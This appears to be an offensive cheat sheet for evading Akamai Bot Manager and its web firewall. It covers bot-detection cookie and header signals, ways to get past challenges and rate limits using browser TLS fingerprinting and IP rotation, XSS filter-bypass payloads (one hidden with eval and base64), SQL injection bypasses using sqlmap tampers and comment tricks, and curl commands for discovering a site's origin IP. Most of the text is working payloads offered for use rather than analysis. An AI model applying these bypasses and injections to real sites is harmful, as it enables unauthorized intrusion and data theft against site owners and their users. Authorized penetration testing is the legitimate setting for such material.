# Akamai Bot Manager

### Detection Signals
| Signal | Where |
|--------|-------|
| `_abck` cookie | Set on first request, JavaScript challenge |
| `ak_bmsc` cookie | Bot management session cookie |
| `x-akamai-transformed` header | Response header |
| `x-akamai-session-info` header | Response header (sometimes) |
| `bm_sz` cookie | Bot manager size cookie |
| `AkamaiGHost` | Server header (rare, usually stripped) |
| Reference ID in 403 body | `Reference #XX.XXXXXXXX.XXXXXXXXXX.XXXXXXXX` |

### Bypass Strategy
- **Recommended tool**: Playwright (headless: false) or curl-cffi with browser TLS fingerprint
- **Rate limit**: 1 request per 5 seconds minimum (). Faster = instant block.
- **Session**: Must solve JavaScript challenge first. Use Playwright to obtain `_abck` cookie, then reuse in curl-cffi.
- **Do NOT use**: raw curl, httpx, or any tool without browser TLS fingerprint
- **Burp**: Use Burp Repeater for single requests after obtaining valid session cookies from Playwright

### XSS Bypass
```
# Akamai blocks: <script>, javascript:, onerror=, onload=
# Bypass via event handlers on non-standard elements:
<details open ontoggle=alert(1)>
<svg/onload=alert`1`>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

# Unicode normalization bypass:
<scrIpt>alert(1)</scrIpt>  (case variation filtered, try full-width chars)
＜script＞alert(1)＜/script＞  (full-width angle brackets)

# Akamai Kona specific — fragment-based:
#"><img src=x onerror=alert(1)>
```

### SQLi Bypass
```
# Akamai blocks: UNION SELECT, OR 1=1, --, /**/
# Bypass via:
sqlmap --tamper=between,randomcase,space2comment -u URL

# Manual bypasses:
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' uNiOn%0asElEcT%0a1,2,3--
' AND 1=(SELECT 1 FROM dual WHERE 1=1)--

# Chunked transfer (if HTTP/1.1):
Transfer-Encoding: chunked
(split payload across chunks)
```

### Rate Limiting
- Aggressive. 403 after ~10-20 rapid requests.
- Per-IP and per-session tracking.
- Recovery: wait 60s after block, rotate IP if persistent.
- **Workaround**: Use Burp Repeater with manual timing (1 req/5s).

### Origin IP Discovery
```bash
# DNS history
curl -s "https://securitytrails.com/domain/TARGET/dns" | grep -oP '\d+\.\d+\.\d+\.\d+'
# Certificate transparency
curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq -r '.[].name_value'
# Shodan
uncover -q "ssl.cert.subject.CN:TARGET" -e shodan
# Email headers (MX records often resolve to origin)
dnsx -d TARGET -resp -mx
```

---

